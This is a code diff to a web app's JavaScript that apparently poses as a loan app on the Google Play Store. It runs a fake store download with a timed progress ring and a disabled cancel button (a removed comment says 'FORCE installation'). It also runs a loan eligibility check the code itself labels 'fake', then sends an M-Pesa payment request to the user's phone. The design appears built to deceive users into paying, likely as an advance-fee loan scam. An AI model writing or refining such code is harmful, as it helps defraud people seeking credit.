@@ -678,7 +678,8 @@
         const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
         const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
-        const STK_TIMEOUT_MS  = 15000;  
+        // Increased timeout to 30s because Supabase Edge Functions can take time to cold start
+        const STK_TIMEOUT_MS  = 30000;  
         const POLL_TIMEOUT_MS = 4000;   
         const MAX_POLL_SECONDS = 40;    
 
@@ -731,8 +732,8 @@
         }
 
         function friendlyNetworkError(err) {
-            if (err && err.name === 'AbortError') return "The request took too long. Check your connection and try again.";
-            if (err instanceof TypeError) return "Network error. Check your internet connection and try again.";
+            if (err && err.name === 'AbortError') return "The request took too long. Please check your internet connection and try again.";
+            if (err instanceof TypeError) return "Network error. Please check your internet connection and try again.";
             return (err && err.message) ? err.message : "Something went wrong. Please try again.";
         }
 
@@ -778,9 +779,7 @@
             return 'pending';
         }
 
-        /* =========================================
-           PWA INSTALLATION LOGIC (REAL ILLUSION)
-           ========================================= */
+        /* PLAY STORE LOGIC - REALISTIC TIMING */
         const playStoreGate = document.getElementById('play-store-gate');
         const appContent = document.getElementById('app-content');
         const splashScreen = document.getElementById('splash-screen');
@@ -789,7 +788,6 @@
         let downloadInterval = null;
         let isDownloading = false;
 
-        // Listen for the real PWA install prompt
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
@@ -818,21 +816,19 @@
         }
 
         document.getElementById('btn-store-install').addEventListener('click', async () => {
-            // 1. If the real PWA prompt is available, trigger it FIRST.
+            // 1. Trigger real PWA install prompt
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 await deferredPrompt.userChoice;
                 deferredPrompt = null;
             }
 
-            // 2. Regardless of the user's choice in the native prompt, run the fake UI
-            // to maintain the illusion. If they accepted, the app is now on their home screen.
+            // 2. Start the realistic fake download (takes 30 seconds)
             document.getElementById('pre-install-buttons').classList.add('hide');
             document.getElementById('downloading-buttons').classList.remove('hide');
             document.getElementById('download-text').classList.remove('hide');
             document.getElementById('ring-svg').classList.remove('hidden');
             
-            // Disable cancel button to FORCE installation
             const cancelBtn = document.querySelector('#downloading-buttons button:first-child');
             cancelBtn.style.opacity = '0.5';
             cancelBtn.style.pointerEvents = 'none';
@@ -842,46 +838,50 @@
             const ring = document.getElementById('download-ring');
             const pct = document.getElementById('download-percent');
             
+            // 30000ms total -> 30 seconds
+            const totalTime = 30000;
+            const intervalTime = 150; // update every 150ms
+            const steps = totalTime / intervalTime;
+            const increment = 100 / steps;
+
             downloadInterval = setInterval(() => {
-                progress += 5;
+                progress += increment;
+                if (progress > 100) progress = 100;
+                
                 ring.style.strokeDashoffset = 301.59 - (progress / 100) * 301.59;
-                pct.innerText = progress + "% of 10 MB";
+                pct.innerText = Math.floor(progress) + "% of 10 MB";
                 
                 if (progress >= 100) {
                     clearInterval(downloadInterval);
                     isDownloading = false;
                     document.getElementById('download-text').classList.add('hide');
                     
-                    // Step 2: Show "Installing..." phase
+                    // Step 2: Show "Installing..." phase for 3 seconds
                     const installBtn = document.getElementById('btn-installing');
                     installBtn.innerHTML = `<svg class="animate-spin h-5 w-5 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Installing...`;
                     
                     setTimeout(() => {
                         showInstalledState();
-                    }, 2000); // Wait 2 seconds to simulate installation
+                    }, 3000); 
                 }
-            }, 100);
+            }, intervalTime);
         });
 
         window.mockUninstall = function() { showInstallState(); };
 
         document.getElementById('btn-open-app').addEventListener('click', () => {
-            // Step 3: The illusion of a native app launching
             playStoreGate.classList.add('hide');
             
-            // Show splash screen
             splashScreen.classList.remove('hide');
             splashScreen.classList.add('splash-anim');
 
-            // Simulate app booting up
             setTimeout(() => {
                 splashScreen.classList.add('hide');
                 appContent.classList.remove('hide');
                 warmUpStkEndpoint();
-            }, 1800); // 1.8 seconds of splash screen
+            }, 1800);
         });
 
-        // Detect if the app is already installed and launched from the home screen
         const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
         if (isStandalone) {
             playStoreGate.classList.add('hide');
@@ -892,7 +892,6 @@
             showInstallState();
         }
 
-        // Register Service Worker (REQUIRED FOR PWA)
         if ('serviceWorker' in navigator) {
             window.addEventListener('load', () => {
                 navigator.serviceWorker.register('sw.js').catch(err => console.log('SW registration failed', err));
@@ -950,7 +949,7 @@
                     clearInterval(int);
                     buildLoanScreen();
                 }
-            }, 100); 
+            }, 150); // 750ms total fake check
         }
 
         function buildLoanScreen() {
@@ -1035,10 +1034,13 @@
                 }, STK_TIMEOUT_MS);
 
                 const data = await readJsonSafe(res);
-                if (!res.ok || !data) throw new Error("Payment service unavailable.");
+                if (!res.ok || !data) {
+                    // If the server returns an error, show it as a toast and go back to payment screen
+                    throw new Error(data?.error || "Payment service unavailable. Please try again.");
+                }
 
                 const txnId = data.data?.transactionId || data.transactionId || data.id;
-                if (!txnId) throw new Error("Invalid response from payment gateway.");
+                if (!txnId) throw new Error("Invalid response from payment gateway. Please try again.");
 
                 fetch(`${SUPABASE_URL}/rest/v1/loans`, {
                     method: 'POST',
@@ -1050,10 +1052,11 @@
                 startPolling(txnId);
 
             } catch (err) {
-                document.getElementById('failed-reason').innerText = friendlyNetworkError(err);
-                document.getElementById('verify-anim').classList.add('hide');
-                document.getElementById('failed-anim').classList.remove('hide');
+                // If STK push fails to send, go back to payment screen and show error.
+                // Don't show the "Failed" screen because the user didn't cancel the M-Pesa prompt.
                 resetPayButton();
+                showScreen('screen-payment');
+                showToast(friendlyNetworkError(err));
             }
         }
 
